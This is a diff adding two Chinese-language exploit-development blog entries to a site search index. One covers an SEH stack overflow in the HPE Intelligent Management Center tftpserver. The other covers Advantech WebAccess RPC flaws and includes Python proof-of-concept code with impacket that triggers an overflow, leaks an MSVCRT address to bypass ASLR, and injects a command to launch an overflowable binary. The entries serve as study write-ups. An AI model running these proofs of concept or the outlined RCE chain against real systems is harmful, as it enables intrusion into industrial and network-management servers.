@@ -2627,4 +2627,118 @@
         <tag>ASLR</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HPE Intelligent Management Center: Stack Buffer Overflow In tftpserver</title>
+    <url>/2022/05/15/HPE-Intelligent-Management-Center-Stack-Buffer-Overflow-In-tftpserver/</url>
+    <content><![CDATA[<p>本次实验讨论在<code>Win10 21h2 x86</code>系统下关闭全局<code>DEP</code>。后续再看开启全局<code>DEP</code>的情况。</p>
+<p>逆向部分的坑：后续再添</p>
+<p>因为涉及的是tftpserver的漏洞利用，需要对tftpserver相关协议有一个了解，这里重点关注：<a href="https://datatracker.ietf.org/doc/html/rfc2347即可。结合前面逆向的分析，这里漏洞点再blksize是我们可以控制的（但是这个值最大为65535），结合tftpserver读文件的时候，导致栈溢出。" target="_blank" rel="noopener">https://datatracker.ietf.org/doc/html/rfc2347即可。结合前面逆向的分析，这里漏洞点再blksize是我们可以控制的（但是这个值最大为65535），结合tftpserver读文件的时候，导致栈溢出。</a></p>
+<p>先来看一下溢出的情况，是一个SEH的栈溢出：</p>
+<p>获取SEH覆盖的Offset：</p>
+<p>发现仅能覆盖Next SEH，这就是问题所在，导致没法利用，<strong>坑点</strong>。</p>
+<p>为了保证我们能够完全覆盖Next SEH和SEH Handler，需要让blksize的值为一个确定值，多次尝试之后最终确定其大小为61400，<strong>最大的坑点</strong>。</p>
+<p>坏字符仅为\x00，这就不过多说了。</p>
+<p>tftp协议相关的部分，我使用了tftpy这个库，可以节省不少时间。</p>
+<p>最终的利用代码：</p>
+<p>成功反弹shell：</p>
+<p>参考：<a href="https://blog.exodusintel.com/2018/10/16/hpe-imc-a-case-study-on-the-reliability-of-security-fixes/" target="_blank" rel="noopener">https://blog.exodusintel.com/2018/10/16/hpe-imc-a-case-study-on-the-reliability-of-security-fixes/</a></p>
+]]></content>
+      <categories>
+        <category>Windows Exploitation</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Stack Based Overflows</tag>
+        <tag>SEH</tag>
+        <tag>DEP</tag>
+        <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Advantech WebAccess 0x2711 IOCTL RCE </title>
+    <url>/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/</url>
+    <content><![CDATA[<p>本次实验讨论在<code>Win10 21h2 x86</code>系统，程序未开启ASLR，所以当初的栈溢出利用很简单，这里将程序加入WDEG，默认开启DEP和ASLR，使用IDA和Windbg相结合的方式对其进行分析。</p>
+<p>安装程序可以从Exploit-DB上下载：<a href="https://www.exploit-db.com/exploits/44278" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44278</a></p>
+<p>用下面的POC来跟进程序执行，梳理程序的运行流程：（包含了impacket，直接在kali里运行即可）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, struct</span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(dce, opcode, stubdata)</span>:</span></span><br><span class="line">  dce.call(opcode, stubdata)</span><br><span class="line">  res = <span class="number">-1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    res = dce.recv()</span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"Exception encountered..."</span> + str(e))</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">  print(<span class="string">"Provide only host arg"</span>)</span><br><span class="line">  sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = <span class="number">4592</span></span><br><span class="line">interface = <span class="string">"5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"</span></span><br><span class="line">version = <span class="string">"1.0"</span> </span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">string_binding = <span class="string">"ncacn_ip_tcp:%s"</span> % host</span><br><span class="line">trans = transport.DCERPCTransportFactory(string_binding)</span><br><span class="line">trans.set_dport(port)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Connecting to the target"</span>)</span><br><span class="line"></span><br><span class="line">dce = trans.get_dce_rpc()</span><br><span class="line">dce.connect()</span><br><span class="line"></span><br><span class="line">iid = uuid.uuidtup_to_bin((interface, version))</span><br><span class="line">dce.bind(iid)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Getting a handle to the RPC server"</span>)</span><br><span class="line">stubdata = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x02</span>)</span><br><span class="line">res = call(dce, <span class="number">4</span>, stubdata)</span><br><span class="line"><span class="keyword">if</span> res == <span class="number">-1</span>:</span><br><span class="line">  print(<span class="string">"Something went wrong"</span>)</span><br><span class="line">  sys.exit(<span class="number">1</span>)</span><br><span class="line">res = struct.unpack(<span class="string">"III"</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len(res) &lt; <span class="number">3</span>):</span><br><span class="line">  print(<span class="string">"Received unexpected length value"</span>)</span><br><span class="line">  sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Sending payload"</span>)</span><br><span class="line"></span><br><span class="line">opcode = <span class="number">11111</span></span><br><span class="line"></span><br><span class="line">stubdata = struct.pack(<span class="string">"&lt;IIII"</span>, res[<span class="number">2</span>], opcode, <span class="number">0x111</span>, <span class="number">0x222</span>)</span><br><span class="line">buf = bytearray([<span class="number">0x41</span>]*<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">stubdata += buf</span><br><span class="line">res = call(dce, <span class="number">1</span>, stubdata)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Done, disconnecting"</span>)</span><br><span class="line"></span><br><span class="line">dce.disconnect()</span><br></pre></td></tr></table></figure>
+
+<p>因为webvkeep是一个监控程序，会维持一个关于webvrpcs的心跳包，windbg attach webvrpcs调试的时候会暂停webvrpcs，导致webvkeep会重启webvrpcs，所以在windbg调试之前，先把webvkeep挂起来。</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/01.png" alt="BOF"></p>
+<p>因为这里分析的程序与rpc协议相关，考虑IDA Plugin <a href="https://github.com/sourceincite/tools/tree/master/pymsrpc/mIDA" target="_blank" rel="noopener">mIDA</a>来加快分析</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/02.png" alt="BOF"></p>
+<p>上面POC使用的Opcode为0x01，这里跟进到0x01所对应的函数sub_401260，IDA中跟进到函数所在地址，暂时看不出来更多信息，在windbg中相应位置下断点：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/03.png" alt="BOF"></p>
+<p>这里有个小诀窍，Windbg和IDA结合着看，一般只看自定义的函数即可，系统自带的函数可以直接跳过。</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/04.png" alt="BOF"></p>
+<p>结合IDA看一下：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/05.png" alt="BOF"></p>
+<p>sub_4046D0似乎挺有意思，windbg中跟进sub_402C60：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/06.png" alt="BOF"></p>
+<p>执行sub_4046D0之前，寄存器值得情况，ebx中保存的是POC传入的Opcode 11111,看一下此刻栈中保存的值：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/07.png" alt="BOF"></p>
+<p>我们传入的Opcode 11111会做为参数进入sub_4046D0函数，跟进该函数，后续进入一系列判断：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/08.png" alt="BOF"></p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/09.png" alt="BOF"></p>
+<p>判断Opcode是否在0x2710h到0x4E20h之间，0x2b67（11111）在它们之间。最后，进入如下分支：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/10.png" alt="BOF"></p>
+<p>DaDaqWebService函数是我们需要找到的函数，跟进去看一下，注意windbg中如下指令：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/11.png" alt="BOF"></p>
+<p>其中，edx保存的是传入的Opcode，edx的值减去0x2710h（10000），然后存入eax，后续都是拿eax的值在进行比较。观察IDA的分支，其实分成三部分，eax大于78h（118）、小于78h（分小于和等于）。</p>
+<p>大于或者小于分支：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/13.png" alt="BOF"></p>
+<p>小于或者等于分支：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/14.png" alt="BOF"></p>
+<p>在小于78h下面的分支中，发现一个有意思的地方：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/12.png" alt="BOF"></p>
+<p>调用了fopen函数，如果该函数没有关闭打开的文件句柄，是可以导致内存信息泄露的，跟进发现fopen后续没有对应的关闭句柄操作。因为程序开启了ASLR，可以通过这个地方的脆弱点导致内存信息泄露，进而bypass ASLR。</p>
+<p>fopen的参数是我们可以控制的，注意fopen每个参数代表的意义。先来确定需要多少字符才能覆盖到ecx和eax。</p>
+<p>fopen调用之前，看一下ecx和eax的值：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/21.png" alt="BOF"></p>
+<p>得到他们的offset为如下所示：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/22.png" alt="BOF"></p>
+<p>随便找一个存在的文件名，看一下代码相关部分：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="number">0x277a</span></span><br><span class="line"></span><br><span class="line">stubdata = struct.pack(<span class="string">"&lt;IIII"</span>, res[<span class="number">2</span>], opcode, <span class="number">0x111</span>, <span class="number">0x222</span>)</span><br><span class="line">buf = bytearray(<span class="string">b"C:\\WebAccess\\Node\\BwPAlarm.dll"</span>+<span class="string">b"\x00"</span>*<span class="number">230</span>+<span class="string">b"r"</span>+<span class="string">b"\x00"</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>eax和ecx设置不正确会出现Invalid parameter passed to C runtime function。我开始把两个值设置反了，导致出现这个异常。</p>
+<p>来看一下设置正确后，fopen执行之后，发现返回的指针指向MSVCRT.DLL的某个地址：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/23.png" alt="BOF"></p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/24.png" alt="BOF"></p>
+<p>进一步验证，发现POC代码的返回值也是指向MSVCRT.DLL某个地址的指针。这样，就可以获取MSVCRT.DLL的基地址，然后从MSVCRT.DLL中产生ROP链，最终可以bypass ASLR。</p>
+<p>继续看一下Opcode为0x2711时，最后会进入如下分支：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/15.png" alt="BOF"></p>
+<p>跟进sub_1D17B0：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/16.png" alt="BOF"></p>
+<p>lpCommandLine是我们可以控制的，导致这里存在命令注入。windbg中调试确认一下：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/17.png" alt="BOF"></p>
+<p>现在命令注入只能启动系统已有的程序（包括自带的或其他安装的程序），为了能够触发RCE，考虑是否可以触发一个程序，然后该程序存在栈溢出，这样就可以触发RCE。</p>
+<p>Advantech WebAccess中就存在很多这样的程序，这里以bwaccrts.exe为例。</p>
+<p>开启windbg调试子进程：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/18.png" alt="BOF"></p>
+<p>或者将windbg执行目录加入环境变量，然后管理员权限下的cmd，运行windbg -I，这样程序崩溃后会启动windbg进行调试。</p>
+<p>启动bwaccrts.exe的部分代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="number">0x2711</span></span><br><span class="line"></span><br><span class="line">stubdata = struct.pack(<span class="string">"&lt;IIII"</span>, res[<span class="number">2</span>], opcode, <span class="number">0x204</span>, <span class="number">0x204</span>)</span><br><span class="line">overflow = <span class="string">b"\x41"</span>*<span class="number">0x1000</span></span><br><span class="line">attack = <span class="string">b"C:\\WebAccess\\Node\\bwaccrts.exe 1 %s"</span> %overflow</span><br><span class="line">attlen = len(attack)</span><br><span class="line">fmt = <span class="string">"&lt;"</span>+str(attlen)+<span class="string">"s"</span></span><br><span class="line">stubdata += struct.pack(fmt, attack)</span><br><span class="line">res = call(dce, <span class="number">1</span>, stubdata)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<p>查看windbg：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/19.png" alt="BOF"></p>
+<p>可以看到EIP被覆盖了，这里存在栈溢出。IDA中看一下：</p>
+<p><img src="/2022/05/22/Advantech-WebAccess-0x2711-IOCTL-RCE/20.png" alt="BOF"></p>
+<p>漏洞点在sscanf函数，因为我们控制的输入会传入sscanf函数，最终导致栈溢出。</p>
+<p>梳理一下RCE的利用流程：</p>
+<p>1.利用0x277A的内存信息泄露获取MSVCRT.dll的基地址</p>
+<p>2.构建基于MSVCRT.dll的ROP链</p>
+<p>3.利用0x2711的代码注入漏洞，启动bwaccrts.exe</p>
+<p>4.栈溢出bwaccrts.exe</p>
+<p>5.最终绕过ASLR和DEP</p>
+<p>来看一下实现：</p>
+]]></content>
+      <categories>
+        <category>Windows Exploitation</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Stack Based Overflows</tag>
+        <tag>DEP</tag>
+        <tag>ROP</tag>
+      </tags>
+  </entry>
 </search>
